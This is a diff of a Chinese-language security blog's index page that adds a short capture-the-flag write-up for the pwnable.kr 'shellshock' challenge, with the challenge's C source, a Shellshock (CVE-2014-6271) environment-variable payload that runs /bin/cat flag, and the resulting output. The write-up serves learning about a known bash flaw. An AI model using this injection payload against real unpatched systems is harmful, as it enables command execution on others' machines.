@@ -60,9 +60,7 @@
 <body>
   <div id="container">
 
-<script id="__bs_script__">//<![CDATA[
-  document.write("<script async src='http://HOST:3000/browser-sync/browser-sync-client.js?v=2.23.6'><\/script>".replace("HOST", location.hostname));
-//]]></script>  
+ 
     <div class="left-col">
     <div class="overlay"></div>
 <div class="intrude-less">
@@ -143,7 +141,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/Far-Manager/" style="font-size: 10px;">Far Manager</a> <a href="/tags/Pwnable/" style="font-size: 20px;">Pwnable</a> <a href="/tags/Reversing/" style="font-size: 16.67px;">Reversing</a> <a href="/tags/hacker/" style="font-size: 13.33px;">hacker</a> <a href="/tags/powershell/" style="font-size: 13.33px;">powershell</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a>
+                        <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/Far-Manager/" style="font-size: 10px;">Far Manager</a> <a href="/tags/Pwnable/" style="font-size: 20px;">Pwnable</a> <a href="/tags/Reversing/" style="font-size: 16.67px;">Reversing</a> <a href="/tags/hacker/" style="font-size: 13.33px;">hacker</a> <a href="/tags/powershell/" style="font-size: 13.33px;">powershell</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a> <a href="/tags/逆向笔记/" style="font-size: 10px;">逆向笔记</a>
                     </div>
                 </section>
                 
@@ -206,6 +204,85 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-Pwnable-kr-shellshock" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/posts/8f13cc3.html" class="article-date">
+      <time datetime="2016-04-03T21:21:09.000Z" itemprop="datePublished">2016-04-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/posts/8f13cc3.html">Pwnable.kr shellshock</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这道题比较简单，对”破壳”漏洞了解的同学都能做出来。</p>
+<pre><code class="c++">#include &lt;stdio.h&gt;                                                
+int main(){                                                       
+        setresuid(getegid(), getegid(), getegid());               
+        setresgid(getegid(), getegid(), getegid());               
+        system(&quot;/home/shellshock/bash -c &#39;echo shock_me&#39;&quot;);       
+        return 0;                                                 
+}                                                                 
+</code></pre>
+<p>源码中调用了题目提供的有漏洞的bash,我们可以构造如下命令来打印出flag:</p>
+<pre><code>    env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock</code></pre><p>上面这条命令相当于直接使用shellshcok调用的bash直接执行了<code>/bin/cat flag</code>,</p>
+<pre><code class="bash">shellshock@ubuntu:~$ env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock    
+only if I knew CVE-2014-6271 ten years ago..!!                       
+Segmentation fault                                                   
+</code></pre>
+<p>先了解这个漏洞的同学可以看看这两篇文章</p>
+<p><a href="http://coolshell.cn/articles/11973.html" target="_blank" rel="noopener">bash代码注入的安全漏洞</a><br><a href="http://drops.wooyun.org/papers/3268" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试</a></p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/challenge/">challenge</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwnable/">Pwnable</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-VirusTotal扫描器-python版" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -820,73 +897,6 @@
       
         <p class="article-more-link">
           <a  href="/posts/905112aa.html#more">大航海 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pwnable-kr-bof" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/posts/88524310.html" class="article-date">
-      <time datetime="2016-01-06T22:29:25.000Z" itemprop="datePublished">2016-01-06</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/posts/88524310.html">pwnable.kr bof</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>一个简单的缓冲区溢出,用gdb调试，<br><img src="http://t.cn/R51Tybh" alt><br>程序首先传入一个参数0xdeadbeef,然后调用func函数，看看func处代码<br><img src="http://t.cn/R51Typs" alt><br> <code>_IO_get</code>获取输入的数据，然后比较<code>ebp+8</code>和0xcafebabe是否相等，相等则打印flag。</p>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/challenge/">challenge</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwnable/">Pwnable</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a  href="/posts/88524310.html#more">大航海 >></a>
         </p>
       
       <div class="clearfix"></div>
